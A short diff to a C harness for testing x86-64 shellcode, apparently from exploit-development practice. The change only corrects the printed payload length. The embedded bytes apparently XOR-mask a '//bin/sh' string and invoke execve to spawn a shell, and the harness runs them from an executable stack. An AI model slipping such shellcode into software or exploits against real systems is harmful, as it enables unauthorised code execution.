@@ -51,6 +51,6 @@ C: gcc shellcode.c -o shellcode -z execstack && ./shellcode
 unsigned char shellcode[] = \
 "\x48\x31\xd2\x48\x31\xf6\x6a\x00\x48\xbf\x6e\x6e\x23\x28\x6e\x2f\x73\x68\x48\x81\xf7\x41\x41\x41\x41\x57\x48\x89\xe7\xb0\x3b\x0f\x05";
 void main(){
-    printf("Lenght: %d\n", sizeof(shellcode));
+    printf("Lenght: %d\n", sizeof(shellcode)-1);
     (*(void(*)()) shellcode)();
 }
